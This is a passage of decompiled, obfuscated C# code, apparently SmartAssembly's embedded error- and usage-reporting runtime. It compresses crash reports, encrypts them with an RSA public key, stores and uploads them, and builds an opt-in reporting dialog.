using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.IO.IsolatedStorage;
using System.Net;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Cryptography;
using System.Security.Permissions;
using System.Text;
using System.Threading;
using System.Web.Services.Protocols;
using System.Windows.Forms;
using Microsoft.Win32;
using SmartAssembly.SmartExceptionsCore;
using ns0;
using ns1;
using ns2;
using ns3;
using ns4;
using ns6;
using ns7;
using ns8;
using ns9;

namespace ns5;

internal class Class24
{
	static bool smethod_0()
	{
		return Class2.smethod_0();
	}

	unsafe static int smethod_1(Class7.Class9 class9_0, int int_0)
	{
		void* ptr = stackalloc byte[8];
		if (int_0 == 255)
		{
			*(int*)((byte*)ptr + 4) = 285;
		}
		else
		{
			*(int*)ptr = 257;
			while (int_0 >= 8)
			{
				*(int*)ptr += 4;
				int_0 >>= 1;
			}
			*(int*)((byte*)ptr + 4) = *(int*)ptr + int_0;
		}
		return *(int*)((byte*)ptr + 4);
	}

	static string smethod_2(Class15.Class19 class19_0)
	{
		return class19_0.string_1;
	}

	static Class40 smethod_3()
	{
		using (Class24.smethod_130())
		{
			Class40 result = Class24.smethod_124();
			Class24.smethod_22();
			return result;
		}
	}

	static void smethod_4(Exception exception_0, object object_0, object object_1, object object_2)
	{
		Class24.smethod_120(exception_0, new object[3] { object_0, object_1, object_2 });
	}

	static IsolatedStorageFileStream smethod_5(FileAccess fileAccess_0, string string_0, FileMode fileMode_0)
	{
		return new IsolatedStorageFileStream(string_0, fileMode_0, fileAccess_0, FileShare.None, Class41.isolatedStorageFile_0);
	}

	unsafe static int smethod_6(Class16 class16_0, string string_0)
	{
		void* ptr = stackalloc byte[18];
		try
		{
			((byte*)ptr)[16] = ((class16_0.char_0[0] == '\u0001') ? ((byte)1) : ((byte)0));
			if (string_0 != null && string_0.Length != 0 && (((byte*)ptr)[16] == 0 || string_0.Length <= 4) && (((byte*)ptr)[16] != 0 || string_0[0] == '#'))
			{
				*(int*)ptr = 0;
				*(int*)((byte*)ptr + 4) = string_0.Length - 1;
				while (true)
				{
					if (*(int*)((byte*)ptr + 4) >= 0 && (((byte*)ptr)[16] != 0 || *(int*)((byte*)ptr + 4) != 0))
					{
						char c = string_0[*(int*)((byte*)ptr + 4)];
						((byte*)ptr)[17] = 0;
						*(int*)((byte*)ptr + 8) = 0;
						while (*(int*)((byte*)ptr + 8) < class16_0.char_0.Length)
						{
							if (class16_0.char_0[*(int*)((byte*)ptr + 8)] != c)
							{
								(*(int*)((byte*)ptr + 8))++;
								continue;
							}
							*(int*)ptr = *(int*)ptr * class16_0.char_0.Length + *(int*)((byte*)ptr + 8);
							((byte*)ptr)[17] = 1;
							break;
						}
						if (((byte*)ptr)[17] != 0)
						{
							(*(int*)((byte*)ptr + 4))--;
							continue;
						}
						*(int*)((byte*)ptr + 12) = -1;
						break;
					}
					*(int*)((byte*)ptr + 12) = *(int*)ptr;
					break;
				}
			}
			else
			{
				*(int*)((byte*)ptr + 12) = -1;
			}
		}
		catch
		{
			*(int*)((byte*)ptr + 12) = -1;
		}
		return *(int*)((byte*)ptr + 12);
	}

	static bool smethod_7(Class16 class16_0, string string_0)
	{
		try
		{
			byte[] byte_ = class16_0.method_4();
			byte[] byte_2;
			try
			{
				byte_2 = Class24.smethod_20(byte_);
			}
			catch
			{
				byte_2 = null;
			}
			byte[] array = Class24.smethod_115(byte_2, "<RSAKeyValue><Modulus>6POlwBPuq+mi8XnSXuadMJr13KU0ci+373fiGgZBV/236L2gUy/svnPzgvl4CU8LLbaJh1ckXZKno3okUWCnSgEj/U2ySWSJ+/R3WtlWnMp6166Ge5bll2T/ulQmy71IMh3oXCEePRZYmFJQTjsig72y+Aeu1n6ACEokozIlpLU=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>");
			FileStream fileStream = File.OpenWrite(string_0);
			byte[] bytes = Encoding.ASCII.GetBytes("{FDC54A6F-5294-4961-88B8-331D8BE2D74A}");
			fileStream.Write(bytes, 0, bytes.Length);
			fileStream.Write(array, 0, array.Length);
			fileStream.Close();
			return true;
		}
		catch (ThreadAbortException)
		{
			return false;
		}
		catch (Exception)
		{
			return false;
		}
	}

	static bool smethod_8(Class7.Class11 class11_0)
	{
		return class11_0.int_8 == class11_0.int_7;
	}

	static Exception smethod_9(EventArgs0 eventArgs0_0)
	{
		return eventArgs0_0.exception_0;
	}

	unsafe static bool smethod_10(bool bool_0, Class7.Class11 class11_0, bool bool_1)
	{
		void* ptr = stackalloc byte[2];
		do
		{
			Class24.smethod_19(class11_0);
			bool bool_2 = bool_0 && class11_0.int_7 == class11_0.int_8;
			*(bool*)ptr = Class24.smethod_67(bool_2, class11_0, bool_1);
		}
		while (Class24.smethod_92(class11_0.class12_0) && *(bool*)ptr);
		((byte*)ptr)[1] = *(byte*)ptr;
		return ((byte*)ptr)[1] != 0;
	}

	static void smethod_11(bool bool_0, EventArgs2 eventArgs2_0)
	{
		eventArgs2_0.bool_0 = bool_0;
	}

	static Bitmap smethod_12(string string_0)
	{
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("SmartAssembly.SmartExceptionsCore.Resources." + string_0 + ".png");
			return (manifestResourceStream == null) ? ((Bitmap)null) : new Bitmap(manifestResourceStream);
		}
		catch
		{
			return null;
		}
	}

	static void smethod_13(Class15 class15_0, Enum0 enum0_0, string string_0)
	{
		Class24.smethod_94(class15_0, enum0_0, string_0, string.Empty);
	}

	unsafe static void smethod_14(Class7.Class9.Class10 class10_0, int[] int_0)
	{
		void* ptr = stackalloc byte[36];
		class10_0.byte_0 = new byte[class10_0.short_0.Length];
		*(int*)ptr = int_0.Length / 2;
		*(int*)((byte*)ptr + 4) = (*(int*)ptr + 1) / 2;
		*(int*)((byte*)ptr + 8) = 0;
		*(int*)((byte*)ptr + 12) = 0;
		while (*(int*)((byte*)ptr + 12) < class10_0.int_3)
		{
			class10_0.int_2[*(int*)((byte*)ptr + 12)] = 0;
			(*(int*)((byte*)ptr + 12))++;
		}
		int[] array = new int[*(int*)ptr];
		array[*(int*)ptr - 1] = 0;
		*(int*)((byte*)ptr + 16) = *(int*)ptr - 1;
		while (*(int*)((byte*)ptr + 16) >= 0)
		{
			if (int_0[2 * *(int*)((byte*)ptr + 16) + 1] != -1)
			{
				*(int*)((byte*)ptr + 20) = array[*(int*)((byte*)ptr + 16)] + 1;
				if (*(int*)((byte*)ptr + 20) > class10_0.int_3)
				{
					*(int*)((byte*)ptr + 20) = class10_0.int_3;
					(*(int*)((byte*)ptr + 8))++;
				}
				array[int_0[2 * *(int*)((byte*)ptr + 16)]] = (array[int_0[2 * *(int*)((byte*)ptr + 16) + 1]] = *(int*)((byte*)ptr + 20));
			}
			else
			{
				*(int*)((byte*)ptr + 24) = array[*(int*)((byte*)ptr + 16)];
				class10_0.int_2[*(int*)((byte*)ptr + 24) - 1]++;
				class10_0.byte_0[int_0[2 * *(int*)((byte*)ptr + 16)]] = (byte)array[*(int*)((byte*)ptr + 16)];
			}
			(*(int*)((byte*)ptr + 16))--;
		}
		if (*(int*)((byte*)ptr + 8) == 0)
		{
			return;
		}
		int num = class10_0.int_3 - 1;
		while (true)
		{
			if (class10_0.int_2[--num] != 0)
			{
				do
				{
					class10_0.int_2[num]--;
					class10_0.int_2[++num]++;
					*(int*)((byte*)ptr + 8) -= 1 << class10_0.int_3 - 1 - num;
				}
				while (*(int*)((byte*)ptr + 8) > 0 && num < class10_0.int_3 - 1);
				if (*(int*)((byte*)ptr + 8) <= 0)
				{
					break;
				}
			}
		}
		class10_0.int_2[class10_0.int_3 - 1] += *(int*)((byte*)ptr + 8);
		class10_0.int_2[class10_0.int_3 - 2] -= *(int*)((byte*)ptr + 8);
		int num2 = 2 * *(int*)((byte*)ptr + 4);
		*(int*)((byte*)ptr + 28) = class10_0.int_3;
		while (*(int*)((byte*)ptr + 28) != 0)
		{
			*(int*)((byte*)ptr + 32) = class10_0.int_2[*(int*)((byte*)ptr + 28) - 1];
			while (*(int*)((byte*)ptr + 32) > 0)
			{
				int num3 = 2 * int_0[num2++];
				if (int_0[num3 + 1] == -1)
				{
					class10_0.byte_0[int_0[num3]] = (byte)(*(uint*)((byte*)ptr + 28));
					(*(int*)((byte*)ptr + 32))--;
				}
			}
			(*(int*)((byte*)ptr + 28))--;
		}
	}

	unsafe static bool smethod_15()
	{
		void* ptr = stackalloc byte[2];
		if (IntPtr.Size == 8)
		{
			((byte*)ptr)[1] = 1;
		}
		else if (Class24.smethod_33("kernel32.dll", "IsWow64Process") && Class24.IsWow64Process(Class24.GetCurrentProcess(), out *(bool*)ptr))
		{
			((byte*)ptr)[1] = *(byte*)ptr;
		}
		else
		{
			((byte*)ptr)[1] = 0;
		}
		return ((byte*)ptr)[1] != 0;
	}

	static bool smethod_16()
	{
		try
		{
			Class28.Struct9 struct9_ = default(Class28.Struct9);
			Class24.GetSystemInfo(ref struct9_);
			return struct9_.ushort_0 == 9;
		}
		catch
		{
			return false;
		}
	}

	static void smethod_17(string string_0, Class37 class37_0, Delegate4 delegate4_0, string string_1, string string_2, byte[] byte_0)
	{
		try
		{
			ReportingService1 reportingService = new ReportingService1(class37_0.string_2);
			if (class37_0.iwebProxy_0 != null)
			{
				((HttpWebClientProtocol)reportingService).set_Proxy(class37_0.iwebProxy_0);
			}
			delegate4_0(reportingService.UploadReport2(class37_0.string_1, byte_0, string_2, string_0, string_1));
		}
		catch (Exception ex)
		{
			delegate4_0("ERR 2002: " + ex.Message);
		}
	}

	static bool smethod_18(Class7.Class8 class8_0)
	{
		if (class8_0.int_0 == 30)
		{
			return Class24.smethod_92(class8_0.class12_0);
		}
		return false;
	}

	static void smethod_19(Class7.Class11 class11_0)
	{
		if (class11_0.int_4 >= 65274)
		{
			Class24.smethod_105(class11_0);
		}
		while (class11_0.int_5 < 262 && class11_0.int_7 < class11_0.int_8)
		{
			int num = 65536 - class11_0.int_5 - class11_0.int_4;
			if (num > class11_0.int_8 - class11_0.int_7)
			{
				num = class11_0.int_8 - class11_0.int_7;
			}
			Array.Copy(class11_0.byte_1, class11_0.int_7, class11_0.byte_0, class11_0.int_4 + class11_0.int_5, num);
			class11_0.int_7 += num;
			class11_0.int_6 += num;
			class11_0.int_5 += num;
		}
		if (class11_0.int_5 >= 3)
		{
			Class24.smethod_44(class11_0);
		}
	}

	static byte[] smethod_20(byte[] byte_0)
	{
		return Class24.smethod_83((byte[])null, byte_0, (byte[])null, 1);
	}

	static void smethod_21(Class33 class33_0)
	{
		if (class33_0.class40_0 == null)
		{
			class33_0.class40_0 = Class24.smethod_3();
		}
		class33_0.method_0();
		byte[] byte_ = class33_0.byte_0;
		Class32.Class36 class36_ = Class32.Class36.class36_0;
		Class24.smethod_58(class36_, (Class32)class33_0, byte_);
	}

	static void smethod_22()
	{
		Class24.smethod_180(Class41.string_1);
		try
		{
			string[] fileNames = Class41.isolatedStorageFile_0.GetFileNames(Class41.string_2 + "\\*.bin");
			foreach (string text in fileNames)
			{
				string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(text);
				string string_ = Path.Combine(Class41.string_2, text);
				Class24.smethod_180(string_);
				string string_2 = Path.Combine(Class41.string_2, fileNameWithoutExtension + ".txt");
				Class24.smethod_180(string_2);
			}
		}
		catch (DirectoryNotFoundException)
		{
		}
		try
		{
			Class41.isolatedStorageFile_0.DeleteDirectory(Class41.string_2);
		}
		catch (IsolatedStorageException)
		{
		}
		Class41.isolatedStorageFile_0.CreateDirectory(Class41.string_2);
	}

	static void smethod_23(Class15 class15_0, Delegate1 delegate1_0)
	{
		Delegate1 @delegate = class15_0.delegate1_0;
		Delegate1 delegate2;
		do
		{
			delegate2 = @delegate;
			Delegate1 value = (Delegate1)Delegate.Combine(delegate2, delegate1_0);
			@delegate = Interlocked.CompareExchange(ref class15_0.delegate1_0, value, delegate2);
		}
		while ((object)@delegate != delegate2);
	}

	static void smethod_24(Class7.Class9 class9_0)
	{
		class9_0.int_1 = 0;
		class9_0.int_2 = 0;
	}

	static bool smethod_25()
	{
		if (!Class44.nullable_0.HasValue)
		{
			Class44.smethod_0();
		}
		return Class44.nullable_0.Value;
	}

	static bool smethod_26(EventArgs3 eventArgs3_0)
	{
		return eventArgs3_0.bool_0;
	}

	static int smethod_27(Class7.Class12 class12_0)
	{
		return class12_0.int_2;
	}

	unsafe static void smethod_28(Class7.Class9 class9_0)
	{
		void* ptr = stackalloc byte[20];
		*(int*)ptr = 0;
		while (*(int*)ptr < class9_0.int_1)
		{
			*(int*)((byte*)ptr + 4) = class9_0.byte_1[*(int*)ptr] & 0xFF;
			int num = class9_0.short_0[*(int*)ptr];
			if (num-- != 0)
			{
				*(int*)((byte*)ptr + 8) = Class24.smethod_1(class9_0, *(int*)((byte*)ptr + 4));
				Class24.smethod_160(class9_0.class10_0, *(int*)((byte*)ptr + 8));
				*(int*)((byte*)ptr + 12) = (*(int*)((byte*)ptr + 8) - 261) / 4;
				if (*(int*)((byte*)ptr + 12) > 0 && *(int*)((byte*)ptr + 12) <= 5)
				{
					Class24.smethod_89(class9_0.class12_0, *(int*)((byte*)ptr + 4) & ((1 << *(int*)((byte*)ptr + 12)) - 1), *(int*)((byte*)ptr + 12));
				}
				*(int*)((byte*)ptr + 16) = Class24.smethod_66(class9_0, num);
				Class24.smethod_160(class9_0.class10_1, *(int*)((byte*)ptr + 16));
				*(int*)((byte*)ptr + 12) = *(int*)((byte*)ptr + 16) / 2 - 1;
				if (*(int*)((byte*)ptr + 12) > 0)
				{
					Class24.smethod_89(class9_0.class12_0, num & ((1 << *(int*)((byte*)ptr + 12)) - 1), *(int*)((byte*)ptr + 12));
				}
			}
			else
			{
				Class24.smethod_160(class9_0.class10_0, *(int*)((byte*)ptr + 4));
			}
			(*(int*)ptr)++;
		}
		Class24.smethod_160(class9_0.class10_0, 256);
	}

	static void smethod_29(Class16 class16_0)
	{
		try
		{
			string tempFileName = Path.GetTempFileName();
			Class24.smethod_7(class16_0, tempFileName);
			string path = Class24.smethod_132();
			Process.Start(Path.Combine(path, "SmartAssembly.exe"), "/AddExceptionReport \"" + tempFileName + "\"");
			if (class16_0.eventHandler_0 != null)
			{
				class16_0.eventHandler_0(class16_0, EventArgs.Empty);
			}
		}
		catch (ThreadAbortException)
		{
		}
		catch (Exception exception_)
		{
			Class24.smethod_136(new EventArgs0(exception_), class16_0);
		}
	}

	static bool smethod_30(EventArgs1 eventArgs1_0)
	{
		return eventArgs1_0.bool_0;
	}

	static string smethod_31(string string_0)
	{
		if (string_0.StartsWith("\"<RSAKeyValue>") && string_0.EndsWith("</RSAKeyValue>\""))
		{
			return "*** Information not reported for security reasons ***";
		}
		return string_0;
	}

	static string smethod_32()
	{
		try
		{
			return Application.get_ExecutablePath();
		}
		catch
		{
			return "N/A";
		}
	}

	static bool smethod_33(string string_0, string string_1)
	{
		IntPtr moduleHandle = Class24.GetModuleHandle(string_0);
		if (moduleHandle == IntPtr.Zero)
		{
			return false;
		}
		return Class24.GetProcAddress(moduleHandle, string_1) != IntPtr.Zero;
	}

	static void smethod_34(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4, object object_5, object object_6, object object_7, object object_8)
	{
		Class24.smethod_120(exception_0, new object[9] { object_0, object_1, object_2, object_3, object_4, object_5, object_6, object_7, object_8 });
	}

	static void smethod_35(int int_0, Class7.Class12 class12_0)
	{
		class12_0.byte_0[class12_0.int_1++] = (byte)int_0;
		class12_0.byte_0[class12_0.int_1++] = (byte)(int_0 >> 8);
	}

	static Class28.Struct8 smethod_36()
	{
		if (!Class28.bool_0)
		{
			Class28.struct8_0 = default(Class28.Struct8);
			try
			{
				Class28.struct8_0.int_0 = Marshal.SizeOf(typeof(Class28.Struct8));
				Class24.GetVersionEx(ref Class28.struct8_0);
				Class28.bool_0 = true;
			}
			catch
			{
			}
		}
		return Class28.struct8_0;
	}

	static string smethod_37(Class32.Class36 class36_0)
	{
		return class36_0.string_1;
	}

	unsafe static int smethod_38(Class7.Class8 class8_0, byte[] byte_0)
	{
		void* ptr = stackalloc byte[26];
		*(int*)ptr = 0;
		*(int*)((byte*)ptr + 4) = byte_0.Length;
		*(int*)((byte*)ptr + 8) = *(int*)((byte*)ptr + 4);
		while (true)
		{
			*(int*)((byte*)ptr + 12) = Class24.smethod_65(class8_0.class12_0, byte_0, *(int*)ptr, *(int*)((byte*)ptr + 4));
			*(int*)ptr += *(int*)((byte*)ptr + 12);
			class8_0.long_0 += *(int*)((byte*)ptr + 12);
			*(int*)((byte*)ptr + 4) -= *(int*)((byte*)ptr + 12);
			if (*(int*)((byte*)ptr + 4) != 0 && class8_0.int_0 != 30)
			{
				Class7.Class11 class11_ = class8_0.class11_0;
				((byte*)ptr)[24] = (((class8_0.int_0 & 4) != 0) ? ((byte)1) : ((byte)0));
				((byte*)ptr)[25] = (((class8_0.int_0 & 8) != 0) ? ((byte)1) : ((byte)0));
				if (Class24.smethod_10(((byte*)ptr)[24] != 0, class11_, ((byte*)ptr)[25] != 0))
				{
					continue;
				}
				if (class8_0.int_0 != 16)
				{
					if (class8_0.int_0 == 20)
					{
						*(int*)((byte*)ptr + 16) = 8 + (-Class24.smethod_27(class8_0.class12_0) & 7);
						while (*(int*)((byte*)ptr + 16) > 0)
						{
							Class24.smethod_89(class8_0.class12_0, 2, 10);
							*(int*)((byte*)ptr + 16) -= 10;
						}
						class8_0.int_0 = 16;
					}
					else if (class8_0.int_0 == 28)
					{
						Class24.smethod_155(class8_0.class12_0);
						class8_0.int_0 = 30;
					}
					continue;
				}
				*(int*)((byte*)ptr + 20) = *(int*)((byte*)ptr + 8) - *(int*)((byte*)ptr + 4);
				break;
			}
			*(int*)((byte*)ptr + 20) = *(int*)((byte*)ptr + 8) - *(int*)((byte*)ptr + 4);
			break;
		}
		return *(int*)((byte*)ptr + 20);
	}

	static int smethod_39(string string_0, Graphics graphics_0, Font font_0, int int_0)
	{
		return Size.Ceiling(graphics_0.MeasureString(string_0, font_0, int_0)).Height;
	}

	static void smethod_40(Class16 class16_0, Delegate0 delegate0_0)
	{
		Delegate0 @delegate = class16_0.delegate0_0;
		Delegate0 delegate2;
		do
		{
			delegate2 = @delegate;
			Delegate0 value = (Delegate0)Delegate.Combine(delegate2, delegate0_0);
			@delegate = Interlocked.CompareExchange(ref class16_0.delegate0_0, value, delegate2);
		}
		while ((object)@delegate != delegate2);
	}

	unsafe static void smethod_41(Class7.Class9.Class10 class10_0)
	{
		void* ptr = stackalloc byte[16];
		int[] array = new int[class10_0.int_3];
		*(int*)ptr = 0;
		class10_0.short_1 = new short[class10_0.short_0.Length];
		*(int*)((byte*)ptr + 4) = 0;
		while (*(int*)((byte*)ptr + 4) < class10_0.int_3)
		{
			array[*(int*)((byte*)ptr + 4)] = *(int*)ptr;
			*(int*)ptr += class10_0.int_2[*(int*)((byte*)ptr + 4)] << 15 - *(int*)((byte*)ptr + 4);
			(*(int*)((byte*)ptr + 4))++;
		}
		*(int*)((byte*)ptr + 8) = 0;
		while (*(int*)((byte*)ptr + 8) < class10_0.int_1)
		{
			*(int*)((byte*)ptr + 12) = class10_0.byte_0[*(int*)((byte*)ptr + 8)];
			if (*(int*)((byte*)ptr + 12) > 0)
			{
				class10_0.short_1[*(int*)((byte*)ptr + 8)] = Class24.smethod_45(array[*(int*)((byte*)ptr + 12) - 1]);
				array[*(int*)((byte*)ptr + 12) - 1] += 1 << 16 - *(int*)((byte*)ptr + 12);
			}
			(*(int*)((byte*)ptr + 8))++;
		}
	}

	static void smethod_42(uint uint_0)
	{
		Class44 class43_ = new Class44();
		Class24.smethod_103((Class43)class43_, uint_0);
	}

	static string smethod_43(EventArgs2 eventArgs2_0)
	{
		return eventArgs2_0.string_0;
	}

	static void smethod_44(Class7.Class11 class11_0)
	{
		class11_0.int_0 = (class11_0.byte_0[class11_0.int_4] << 5) ^ class11_0.byte_0[class11_0.int_4 + 1];
	}

	[DllImport("kernel32.dll")]
	static extern IntPtr GetCurrentProcess();

	static short smethod_45(int int_0)
	{
		return (short)((Class7.Class9.byte_0[int_0 & 0xF] << 12) | (Class7.Class9.byte_0[(int_0 >> 4) & 0xF] << 8) | (Class7.Class9.byte_0[(int_0 >> 8) & 0xF] << 4) | Class7.Class9.byte_0[int_0 >> 12]);
	}

	static ICryptoTransform smethod_46(bool bool_0, byte[] byte_0, byte[] byte_1)
	{
		using DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
		return bool_0 ? dESCryptoServiceProvider.CreateDecryptor(byte_0, byte_1) : dESCryptoServiceProvider.CreateEncryptor(byte_0, byte_1);
	}

	static void smethod_47(Class43 class43_0)
	{
		if (!Class43.bool_0)
		{
			Class43.Class45 @class = new Class43.Class45();
			@class.class43_0 = class43_0;
			@class.class40_0 = Class24.smethod_3();
			Thread thread = new Thread(@class.method_0);
			thread.IsBackground = true;
			thread.SetApartmentState(ApartmentState.STA);
			thread.Start();
			AppDomain.CurrentDomain.ProcessExit += class43_0.method_0;
			Class43.bool_0 = true;
		}
	}

	static void smethod_48(Class37 class37_0, IWebProxy iwebProxy_0)
	{
		class37_0.iwebProxy_0 = iwebProxy_0;
	}

	static Bitmap smethod_49(string string_0)
	{
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("SmartAssembly.SmartUsageWithUI.Resources." + string_0 + ".png");
			return (manifestResourceStream == null) ? ((Bitmap)null) : new Bitmap(manifestResourceStream);
		}
		catch
		{
			return null;
		}
	}

	unsafe static void smethod_50(Class7.Class9.Class10 class10_0, Class7.Class9.Class10 class10_1)
	{
		void* ptr = stackalloc byte[20];
		*(int*)((byte*)ptr + 8) = -1;
		*(int*)((byte*)ptr + 12) = 0;
		while (*(int*)((byte*)ptr + 12) < class10_1.int_1)
		{
			int num = 1;
			*(int*)((byte*)ptr + 16) = class10_1.byte_0[*(int*)((byte*)ptr + 12)];
			if (*(int*)((byte*)ptr + 16) == 0)
			{
				*(int*)ptr = 138;
				*(int*)((byte*)ptr + 4) = 3;
			}
			else
			{
				*(int*)ptr = 6;
				*(int*)((byte*)ptr + 4) = 3;
				if (*(int*)((byte*)ptr + 8) != *(int*)((byte*)ptr + 16))
				{
					Class24.smethod_160(class10_0, *(int*)((byte*)ptr + 16));
					num = 0;
				}
			}
			*(int*)((byte*)ptr + 8) = *(int*)((byte*)ptr + 16);
			(*(int*)((byte*)ptr + 12))++;
			while (*(int*)((byte*)ptr + 12) < class10_1.int_1 && *(int*)((byte*)ptr + 8) == class10_1.byte_0[*(int*)((byte*)ptr + 12)])
			{
				(*(int*)((byte*)ptr + 12))++;
				if (++num >= *(int*)ptr)
				{
					break;
				}
			}
			if (num < *(int*)((byte*)ptr + 4))
			{
				while (num-- > 0)
				{
					Class24.smethod_160(class10_0, *(int*)((byte*)ptr + 8));
				}
			}
			else if (*(int*)((byte*)ptr + 8) != 0)
			{
				Class24.smethod_160(class10_0, 16);
				Class24.smethod_89(class10_1.class9_0.class12_0, num - 3, 2);
			}
			else if (num <= 10)
			{
				Class24.smethod_160(class10_0, 17);
				Class24.smethod_89(class10_1.class9_0.class12_0, num - 3, 3);
			}
			else
			{
				Class24.smethod_160(class10_0, 18);
				Class24.smethod_89(class10_1.class9_0.class12_0, num - 11, 7);
			}
		}
	}

	static ulong[] smethod_51(string string_0)
	{
		ulong[] array2;
		using (IsolatedStorageFileStream isolatedStorageFileStream = new IsolatedStorageFileStream(string_0, FileMode.OpenOrCreate, FileAccess.Read, FileShare.None, Class41.isolatedStorageFile_0))
		{
			byte[] array = new byte[isolatedStorageFileStream.Length];
			isolatedStorageFileStream.Read(array, 0, array.Length);
			array2 = new ulong[array.Length / 8];
			Buffer.BlockCopy(array, 0, array2, 0, array.Length);
		}
		return array2;
	}

	static int smethod_52(Class16.Struct6 struct6_0, Class16 class16_0)
	{
		string key = struct6_0.struct5_0.string_0.ToUpper();
		if (class16_0.dictionary_3.ContainsKey(key))
		{
			return class16_0.dictionary_3[key];
		}
		int count = class16_0.list_2.Count;
		class16_0.list_2.Add(struct6_0.struct5_0);
		class16_0.dictionary_3.Add(key, count);
		return count;
	}

	static void smethod_53(string string_0)
	{
		Class44 class43_ = new Class44();
		Class24.smethod_157(string_0, (Class43)class43_);
	}

	static Class40 smethod_54()
	{
		using (Class24.smethod_130())
		{
			return Class24.smethod_124();
		}
	}

	unsafe static bool smethod_55(int int_0, Class7.Class9 class9_0, int int_1)
	{
		void* ptr = stackalloc byte[9];
		class9_0.short_0[class9_0.int_1] = (short)int_1;
		class9_0.byte_1[class9_0.int_1++] = (byte)(int_0 - 3);
		*(int*)ptr = Class24.smethod_1(class9_0, int_0 - 3);
		class9_0.class10_0.short_0[*(int*)ptr]++;
		if (*(int*)ptr >= 265 && *(int*)ptr < 285)
		{
			class9_0.int_2 += (*(int*)ptr - 261) / 4;
		}
		*(int*)((byte*)ptr + 4) = Class24.smethod_66(class9_0, int_1 - 1);
		class9_0.class10_1.short_0[*(int*)((byte*)ptr + 4)]++;
		if (*(int*)((byte*)ptr + 4) >= 4)
		{
			class9_0.int_2 += *(int*)((byte*)ptr + 4) / 2 - 1;
		}
		((byte*)ptr)[8] = (Class24.smethod_77(class9_0) ? ((byte)1) : ((byte)0));
		return ((byte*)ptr)[8] != 0;
	}

	static int smethod_56(Font font_0, int int_0, Graphics graphics_0, string string_0)
	{
		try
		{
			return Class24.smethod_81(font_0, int_0, string_0, graphics_0);
		}
		catch (Exception)
		{
			try
			{
				return Convert.ToInt32((double)Class24.smethod_39(string_0, graphics_0, font_0, int_0) * 1.1);
			}
			catch (Exception)
			{
			}
		}
		return 0;
	}

	static void smethod_57(Class27 class27_0, IWebProxy iwebProxy_0)
	{
		class27_0.iwebProxy_0 = iwebProxy_0;
	}

	[DllImport("shell32")]
	static extern int ExtractIconEx(string string_0, int int_0, ref int int_1, ref int int_2, int int_3);

	unsafe static bool smethod_58(Class32.Class36 class36_0, Class32 class32_0, byte[] byte_0)
	{
		void* ptr = stackalloc byte[2];
		byte[] byte_;
		try
		{
			byte_ = Class24.smethod_20(byte_0);
		}
		catch (Exception)
		{
			Class24.smethod_100(Enum2.const_0, Class7.string_0, class32_0);
			*(sbyte*)ptr = 0;
			goto IL_0020;
		}
		byte[] array = Class24.smethod_70(byte_, "<RSAKeyValue><Modulus>6POlwBPuq+mi8XnSXuadMJr13KU0ci+373fiGgZBV/236L2gUy/svnPzgvl4CU8LLbaJh1ckXZKno3okUWCnSgEj/U2ySWSJ+/R3WtlWnMp6166Ge5bll2T/ulQmy71IMh3oXCEePRZYmFJQTjsig72y+Aeu1n6ACEokozIlpLU=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>");
		if (array == null)
		{
			Class24.smethod_100(Enum2.const_0, Class31.string_0, class32_0);
			((byte*)ptr)[1] = 0;
		}
		else
		{
			Class24.smethod_90(class32_0, Enum2.const_1);
			Class37 @class = new Class37("!bd82831c-4319-2ff1-d95e-1b3435853905");
			if (class32_0.iwebProxy_0 != null)
			{
				Class24.smethod_48(@class, class32_0.iwebProxy_0);
			}
			Class32.Class34 class2 = new Class32.Class34(class32_0, array, @class, class36_0);
			Class24.smethod_171(@class, (Delegate4)class2.method_0);
			((byte*)ptr)[1] = (class2.bool_0 ? ((byte)1) : ((byte)0));
		}
		goto IL_009b;
		IL_0020:
		((byte*)ptr)[1] = *(byte*)ptr;
		goto IL_009b;
		IL_009b:
		return ((byte*)ptr)[1] != 0;
	}

	static void smethod_59(Form2 form2_0)
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_008c: Unknown result type (might be due to invalid IL or missing references)
		//IL_013d: Unknown result type (might be due to invalid IL or missing references)
		//IL_01dc: Unknown result type (might be due to invalid IL or missing references)
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form2));
		form2_0.label_0 = new Label();
		form2_0.button_0 = new Button();
		form2_0.button_1 = new Button();
		((Control)form2_0).SuspendLayout();
		((Control)form2_0.label_0).set_AutoSize(true);
		((Control)form2_0.label_0).set_Location(new Point(12, 16));
		((Control)form2_0.label_0).set_MaximumSize(new Size(480, 800));
		((Control)form2_0.label_0).set_Name("m_Label_Desc");
		((Control)form2_0.label_0).set_Padding(new Padding(0, 0, 0, 92));
		((Control)form2_0.label_0).set_Size(new Size(442, 159));
		((Control)form2_0.label_0).set_TabIndex(1);
		form2_0.label_0.set_TabStop(true);
		((Control)form2_0.label_0).set_Text(componentResourceManager.GetString("m_Label_Desc.Text"));
		form2_0.label_0.set_UseCompatibleTextRendering(true);
		((Control)form2_0.button_0).set_Anchor((AnchorStyles)2);
		form2_0.button_0.set_DialogResult((DialogResult)6);
		((ButtonBase)form2_0.button_0).set_ImageAlign((ContentAlignment)16);
		((Control)form2_0.button_0).set_Location(new Point(97, 105));
		((Control)form2_0.button_0).set_Name("m_SendUsageReportsBtn");
		((Control)form2_0.button_0).set_Padding(new Padding(5, 0, 0, 0));
		((Control)form2_0.button_0).set_Size(new Size(299, 33));
		((Control)form2_0.button_0).set_TabIndex(2);
		((Control)form2_0.button_0).set_Text("Join the quality improvement program");
		((ButtonBase)form2_0.button_0).set_UseVisualStyleBackColor(true);
		((Control)form2_0.button_1).set_Anchor((AnchorStyles)2);
		form2_0.button_1.set_DialogResult((DialogResult)7);
